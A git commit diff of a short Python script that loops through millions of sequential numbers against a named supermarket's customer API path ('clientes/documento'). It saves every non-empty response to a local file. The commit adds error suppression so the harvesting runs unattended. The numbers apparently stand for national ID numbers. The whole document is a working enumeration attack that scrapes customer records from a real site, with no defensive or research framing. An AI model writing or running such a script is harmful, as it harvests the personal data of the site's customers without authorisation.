484e5a0c1d882d02802e9fbd5fa9acb010f6527a
Roberto Focke <robertofocke@users.noreply.github.com>
2017-12-29 15:32:25 -0300

    Update superresis.py

--- repo/superresis.py
+++ repo/superresis.py
@@ -1,12 +1,15 @@
 import requests
 
-for i in range(5000000,50000000):
-	r = requests.get("http://www.iralsuper.com.ar/api/clientes/documento/1/"+str(i))		
+for i in range(5008455,50000000):
+	try:
+		r = requests.get("http://www.iralsuper.com.ar/api/clientes/documento/1/"+str(i))	
+	except:	
+		pass	
 	if len(r.text)==4:
 		pass
 	else:
 		print r.text
-	     	f = open ("fichero.txt", "a")
+		f = open ("fichero.txt", "a")
 		f.write(r.text)
 		f.write("\n")
 		f.close()
